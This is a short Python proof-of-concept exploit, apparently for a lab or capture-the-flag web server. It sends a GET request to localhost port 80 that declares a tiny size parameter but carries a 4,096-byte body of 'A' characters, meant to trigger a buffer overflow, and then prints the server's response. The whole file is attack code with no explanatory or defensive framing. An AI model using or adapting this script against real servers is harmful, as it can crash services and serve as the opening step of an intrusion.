#!/usr/bin/env python3
import socket
import sys
import time

def exploit_get_overflow():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 80))

    # Craft malicious GET request
    size_value = 0x10  # Very small size to allocate
    payload_size = 0x1000  # Much larger payload to cause overflow
    
    # Create payload with pattern
    payload = b'A' * payload_size
    
    # Construct GET request with size parameter
    request = f"GET /?size={size_value} HTTP/1.1\r\n"
    request += "Host: localhost\r\n"
    request += f"Content-Length: {payload_size}\r\n"
    request += "Content-Type: application/octet-stream\r\n"
    request += "\r\n"
    request = request.encode() + payload

    print(f"[*] Size value: 0x{size_value:x}")
    print(f"[*] Payload size: 0x{payload_size:x}")
    
    # Send request
    print("[*] Sending malicious GET request...")
    s.send(request)
    
    # Get response
    response = s.recv(4096)
    print(f"[*] Response received: {response}")
    
    # Close socket
    s.close()

if __name__ == "__main__":
    exploit_get_overflow() 